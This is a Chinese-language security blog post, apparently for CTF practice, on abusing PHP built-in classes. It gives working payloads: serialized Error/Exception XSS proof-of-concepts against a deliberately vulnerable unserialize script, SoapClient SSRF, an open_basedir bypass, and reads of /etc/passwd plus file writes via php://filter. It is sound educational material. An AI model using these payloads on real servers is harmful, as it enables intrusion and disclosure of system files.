<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"ayan0.top","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.24.1","exturl":false,"sidebar":{"position":"left","width_expanded":280,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":false,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>

    <meta name="description" content="PHP原生类 相当综合的应用呢，利用面广的不行，爽赤 常见的原生类有以下几个">
<meta property="og:type" content="article">
<meta property="og:title" content="磨好的利剑:PHP原生类">
<meta property="og:url" content="https://ayan0.top/2025/07/01/%E7%A3%A8%E5%A5%BD%E7%9A%84%E5%88%A9%E5%89%91-PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/">
<meta property="og:site_name" content="Blog of AyaN0">
<meta property="og:description" content="PHP原生类 相当综合的应用呢，利用面广的不行，爽赤 常见的原生类有以下几个">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701145615605.png">
<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701150814244.png">
<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701160148997.png">
<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701160246768.png">
<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250711143413796.png">
<meta property="article:published_time" content="2025-07-01T05:58:51.000Z">
<meta property="article:modified_time" content="2025-07-31T03:07:16.703Z">
<meta property="article:author" content="AyaN0">
<meta property="article:tag" content="-Web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701145615605.png">


<link rel="canonical" href="https://ayan0.top/2025/07/01/%E7%A3%A8%E5%A5%BD%E7%9A%84%E5%88%A9%E5%89%91-PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://ayan0.top/2025/07/01/%E7%A3%A8%E5%A5%BD%E7%9A%84%E5%88%A9%E5%89%91-PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/","path":"2025/07/01/磨好的利剑-PHP原生类/","title":"磨好的利剑:PHP原生类"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>磨好的利剑:PHP原生类 | Blog of AyaN0</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
<script src="/js/third-party/search/local-search.js" defer></script>







  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">
      <img class="custom-logo-image" src="/images/lly.jpg" alt="Blog of AyaN0">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Blog of AyaN0</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="搜索..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#php%E5%8E%9F%E7%94%9F%E7%B1%BB"><span class="nav-number">1.</span> <span class="nav-text"> PHP原生类</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#xss%E5%88%A9%E7%94%A8"><span class="nav-number">1.1.</span> <span class="nav-text"> XSS利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#errorexception%E5%86%85%E7%BD%AE%E7%B1%BB"><span class="nav-number">1.1.1.</span> <span class="nav-text"> Error&#x2F;Exception内置类</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ssrf%E5%88%A9%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text"> SSRF利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#soapclient%E4%BD%95%E8%AE%B8%E4%BA%BA%E4%B9%9F"><span class="nav-number">1.2.1.</span> <span class="nav-text"> SoapClient何许人也?</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#open_basedir%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.</span> <span class="nav-text"> open_basedir绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%93%88%E5%B8%8C%E6%AF%94%E8%BE%83%E7%BB%95%E8%BF%87"><span class="nav-number">1.4.</span> <span class="nav-text"> 哈希比较绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6"><span class="nav-number">1.5.</span> <span class="nav-text"> 读写文件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#splfileobject"><span class="nav-number">1.5.1.</span> <span class="nav-text"> SplFileObject</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#domdocumnet"><span class="nav-number">1.5.2.</span> <span class="nav-text"> DOMDocumnet</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B"><span class="nav-number">1.6.</span> <span class="nav-text"> 文件探测</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8finfo"><span class="nav-number">1.6.1.</span> <span class="nav-text"> 文件是否存在(finfo)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86directory"><span class="nav-number">1.6.2.</span> <span class="nav-text"> 目录遍历:Directory</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86directoryiterator"><span class="nav-number">1.6.3.</span> <span class="nav-text"> 目录遍历:DirectoryIterator</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86filesystemiterator"><span class="nav-number">1.6.4.</span> <span class="nav-text"> 目录遍历:FilesystemIterator</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86globiterator"><span class="nav-number">1.6.5.</span> <span class="nav-text"> 目录遍历:GlobIterator</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9Cziparchive"><span class="nav-number">1.6.6.</span> <span class="nav-text"> 文件操作:ZipArchive</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rce"><span class="nav-number">1.7.</span> <span class="nav-text"> RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A9%BA%E5%AD%97%E8%8A%82%E6%88%AA%E6%96%AD"><span class="nav-number">1.7.1.</span> <span class="nav-text"> 空字节截断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#https"><span class="nav-number">1.7.2.</span> <span class="nav-text"> https:&#x2F;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#vid-tempfile-rce"><span class="nav-number">1.7.3.</span> <span class="nav-text"> vid + tempfile RCE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xxe"><span class="nav-number">1.8.</span> <span class="nav-text"> XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#simplexmlelement"><span class="nav-number">1.8.1.</span> <span class="nav-text"> SimpleXMLElement</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#simplexmliterator"><span class="nav-number">1.8.2.</span> <span class="nav-text"> SimpleXMLIterator</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#imagemagick"><span class="nav-number">1.8.3.</span> <span class="nav-text"> ImageMagick</span></a></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="AyaN0"
      src="/images/lly.jpg">
  <p class="site-author-name" itemprop="name">AyaN0</p>
  <div class="site-description" itemprop="description">不断的前进的人:只有0次摔倒或无数次的爬起</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">28</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">分类</span>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">19</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/kisakiayano" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;kisakiayano" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="/1594453512@qq.com" title="E-Mail → 1594453512@qq.com" rel="noopener me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://ayan0.top/2025/07/01/%E7%A3%A8%E5%A5%BD%E7%9A%84%E5%88%A9%E5%89%91-PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/lly.jpg">
      <meta itemprop="name" content="AyaN0">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Blog of AyaN0">
      <meta itemprop="description" content="不断的前进的人:只有0次摔倒或无数次的爬起">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="磨好的利剑:PHP原生类 | Blog of AyaN0">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          磨好的利剑:PHP原生类
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-07-01 13:58:51" itemprop="dateCreated datePublished" datetime="2025-07-01T13:58:51+08:00">2025-07-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-07-31 11:07:16" itemprop="dateModified" datetime="2025-07-31T11:07:16+08:00">2025-07-31</time>
    </span>

  
    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">阅读次数：</span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>13k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>24 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h1 id="php原生类"><a class="markdownIt-Anchor" href="#php原生类"></a> PHP原生类</h1>
<p>相当综合的应用呢，利用面广的不行，爽赤</p>
<p>常见的原生类有以下几个</p>
<pre><code class="highlight plaintext">1.Error/Exception
2.FilesystemIterator/SplFileObject/DirectoryIterator/GlobIterator
3.SoapClient
4.SimpleXMLElement</code></pre>
<p>当然还有有些偶尔能用上的<code>ZipArchive</code></p>
<h2 id="xss利用"><a class="markdownIt-Anchor" href="#xss利用"></a> XSS利用</h2>
<h3 id="errorexception内置类"><a class="markdownIt-Anchor" href="#errorexception内置类"></a> Error/Exception内置类</h3>
<p><strong>Error</strong>:</p>
<ul>
<li>仅适用于PHP7版本</li>
<li>在开启报错的情况下</li>
</ul>
<p>我们可以查看一下Error的内置方法</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$className</span> = <span class="string">&#x27;Error&#x27;</span>;

<span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$className</span>);

<span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;
    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$className&#125;</span>::<span class="subst">&#123;$method&#125;</span>&quot;</span> . PHP_EOL;
&#125;
<span class="meta">?&gt;</span></code></pre>
<p>得到:</p>
<pre><code class="highlight plaintext">Error::__construct
Error::__wakeup
Error::getMessage
Error::getCode
Error::getFile
Error::getLine
Error::getTrace
Error::getPrevious
Error::getTraceAsString
Error::__toString</code></pre>
<p>那么就可以利用XSS的<code>__toString</code>魔术方法打一个XSS</p>
<p>测试代码:</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>]);
<span class="keyword">echo</span> <span class="variable">$a</span>;
<span class="meta">?&gt;</span></code></pre>
<p>(如果不知道原生类的情况下可能直接趋势了吧</p>
<p>那么就用Error类构造一个POC</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);
<span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);
<span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);  
<span class="meta">?&gt;</span>
<span class="comment">//O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A44%3A%22C%3A%5CUsers%5Cayano%5CPhpstormProjects%5CWWW%5Ctest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</span></code></pre>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701145615605.png" alt="image-20250701145615605"></p>
<p>可以看到成功弹出</p>
<p><code>Exception</code>也是同理的</p>
<p>得到</p>
<pre><code class="highlight plaintext">O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A46%3A%22C%3A%5CUsers%5Cayano%5CPhpstormProjects%5CWWW%5Cmethod.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</code></pre>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701150814244.png" alt="image-20250701150814244"></p>
<h2 id="ssrf利用"><a class="markdownIt-Anchor" href="#ssrf利用"></a> SSRF利用</h2>
<p>用Soap之前先要在php.ini里开一下extension</p>
<p>这里只提供一下PHP8的配置方法，因为7和以上的版本配置的内容是不一样的</p>
<p>先把路径改一下<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701160148997.png" alt="image-20250701160148997"></p>
<p>这里初始是<code>ext</code>，需要改掉并且去掉前面的;</p>
<p>再找到<code>soap</code></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250701160246768.png" alt="image-20250701160246768"></p>
<p>这边也需要去掉前面的;</p>
<p>这样就算配好了。</p>
<h3 id="soapclient何许人也"><a class="markdownIt-Anchor" href="#soapclient何许人也"></a> SoapClient何许人也?</h3>
<p>PHP 的内置类<code> SoapClient</code> 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。</p>
<p>类摘要如下：</p>
<pre><code class="highlight plaintext">SoapClient &#123;
    /* 方法 */
    public __construct ( string|null $wsdl , array $options = [] )
    public __call ( string $name , array $args ) : mixed
    public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null
    public __getCookies ( ) : array
    public __getFunctions ( ) : array|null
    public __getLastRequest ( ) : string|null
    public __getLastRequestHeaders ( ) : string|null
    public __getLastResponse ( ) : string|null
    public __getLastResponseHeaders ( ) : string|null
    public __getTypes ( ) : array|null
    public __setCookie ( string $name , string|null $value = null ) : void
    public __setLocation ( string $location = &quot;&quot; ) : string|null
    public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool
    public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &amp;$outputHeaders = null ) : mixed
&#125;</code></pre>
<p>可以看到，该内置类有一个 <code>__call</code> 方法，当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 <code>__call</code> 方法，使得 <code>SoapClient</code> 类可以被我们运用在 SSRF 中。<code>SoapClient</code> 这个类也算是目前被挖掘出来最好用的一个内置类。</p>
<p>该类的构造函数如下：</p>
<pre><code class="highlight plaintext">public SoapClient :: SoapClient(mixed $wsdl [，array $options ])</code></pre>
<ul>
<li>第一个参数是用来指明是否是<code>wsdl</code>模式，将该值设为null则表示非<code>wsdl</code>模式。</li>
<li>第二个参数为一个数组，如果在<code>wsdl</code>模式下，此参数可选；如果在非<code>wsdl</code>模式下，则必须设置location和<code>uri</code>选项，其中<code>location</code>是要将请求发送到的SOAP服务器的URL，而<code>uri</code> 是SOAP服务的目标命名空间。</li>
</ul>
<p>在知道两个选项的含义之后payload就相当容易构造了</p>
<p><strong>设置第一个参数为null，第二个为<code>target_url</code></strong></p>
<p>这里其实就可以配合<strong>CRLF</strong>或者<strong>HTTP请求走私</strong>搞一下</p>
<h2 id="open_basedir绕过"><a class="markdownIt-Anchor" href="#open_basedir绕过"></a> <code>open_basedir</code>绕过</h2>
<p><code>DirectoryIterator</code>与glob://协议结合将无视<code>open_basedir</code>对目录的限制，可以用来列举出指定目录下的文件。</p>
<h2 id="哈希比较绕过"><a class="markdownIt-Anchor" href="#哈希比较绕过"></a> 哈希比较绕过</h2>
<p><code>Error</code>类是所有php内部错误类的基类 从php7开始被引入</p>
<p><code>Exception</code>类是所有异常的类，从php5开始被引入</p>
<p>这两个都存在<code>__tostring</code>方法</p>
<p>通过echo/return就可以直接触发</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);<span class="comment">//注意这是同一行</span>
<span class="keyword">echo</span> <span class="variable">$a</span>;
<span class="keyword">echo</span> <span class="variable">$b</span>;
<span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span>)
&#123;
	<span class="keyword">echo</span> <span class="string">&quot;a!=b&quot;</span>;
&#125;
<span class="keyword">echo</span><span class="string">&quot;\n&quot;</span>;
<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>));<span class="comment">//这里输出是true</span>
<span class="meta">?&gt;</span></code></pre>
<p>但是如果这样写</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);
<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);<span class="comment">//这里不是同一行</span>
<span class="keyword">echo</span> <span class="variable">$a</span>;
<span class="keyword">echo</span> <span class="variable">$b</span>;
<span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span>)
&#123;
	<span class="keyword">echo</span> <span class="string">&quot;a!=b&quot;</span>;
&#125;
<span class="keyword">echo</span><span class="string">&quot;\n&quot;</span>;
<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>));<span class="comment">//这里输出的是false</span>
<span class="meta">?&gt;</span></code></pre>
<p>这是为什么呢(雾)，看一眼输出就可以发现它的返回值是带有行数的，这个就会导致哈希值不一样</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250711143413796.png" alt="image-20250711143413796"></p>
<p>Exception 类与 Error 的使用和结果完全一样，只不过 Exception 类适用于PHP 5和7，而 Error 只适用于 PHP 7</p>
<h2 id="读写文件"><a class="markdownIt-Anchor" href="#读写文件"></a> 读写文件</h2>
<h3 id="splfileobject"><a class="markdownIt-Anchor" href="#splfileobject"></a> <code>SplFileObject</code></h3>
<p>这个是按行读取的，如果多行读取就需要遍历了</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>);
<span class="keyword">foreach</span>(<span class="variable">$context</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;
    <span class="keyword">echo</span>(<span class="variable">$f</span>);
&#125;
<span class="comment">// 或者用伪协议base64直接输出，有时候有奇效</span>
<span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=/etc/passwd&#x27;</span>);
<span class="keyword">echo</span> <span class="variable">$context</span>;</code></pre>
<p>写:</p>
<pre><code class="highlight plaintext">$f = new SplFileObject(&#x27;./file&#x27;, &quot;w&quot;);
$f-&gt;fwrite(&quot;file&quot;);</code></pre>
<h3 id="domdocumnet"><a class="markdownIt-Anchor" href="#domdocumnet"></a> DOMDocumnet</h3>
<p>这个类本意是处理 XML 和 HTML 内容，不过也有相应的读/写文件的方法，只要利用 伪协议 稍做加工就可以无杂质地对数据进行操作。</p>
<p>读文件:</p>
<pre><code class="highlight php"><span class="comment"># 读文件</span>
<span class="comment"># 先用 convert.base64 将文件内容base64，避免出现额外的 &lt;p&gt; 标签</span>
<span class="comment"># 然后将读取的内容转换成 XML 格式，再加载它，最后取 &lt;p&gt; 标签内的内容 (如果想获取纯净流则可以再进行base64解码)</span>
<span class="variable">$f</span>=<span class="string">&quot;/etc/passwd&quot;</span>;
<span class="variable">$d</span>=<span class="keyword">new</span> <span class="title class_">DOMDocument</span>();
<span class="variable">$d</span>-&gt;<span class="title function_ invoke__">loadHTMLFile</span>(<span class="string">&quot;php://filter/convert.base64-encode/resource=<span class="subst">$f</span>&quot;</span>);
<span class="variable">$d</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$d</span>-&gt;<span class="title function_ invoke__">saveXML</span>());
<span class="keyword">echo</span> <span class="variable">$d</span>-&gt;<span class="title function_ invoke__">getElementsByTagName</span>(<span class="string">&quot;p&quot;</span>)[<span class="number">0</span>]-&gt;textContent;</code></pre>
<p>写文件</p>
<pre><code class="highlight php"><span class="comment"># 写文件</span>
<span class="comment"># 先用 string.strip_tags 将多余的 HTML 标签去掉，然后再用 convert.base64 将多余的其他杂质 (如空格，双引号等非base64字符去掉)</span>
<span class="variable">$f</span>=<span class="string">&quot;./test.php&quot;</span>;
<span class="variable">$d</span>=<span class="keyword">new</span> <span class="title class_">DOMDocument</span>();
<span class="variable">$d</span>-&gt;<span class="title function_ invoke__">loadHTML</span>(<span class="string">&quot;dGVzdA==&quot;</span>);
<span class="variable">$d</span>-&gt;<span class="title function_ invoke__">saveHtmlFile</span>(<span class="string">&quot;php://filter/string.strip_tags|convert.base64-decode/resource=<span class="subst">$f</span>&quot;</span>);</code></pre>
<p>读文件：<code>Xinclude</code></p>
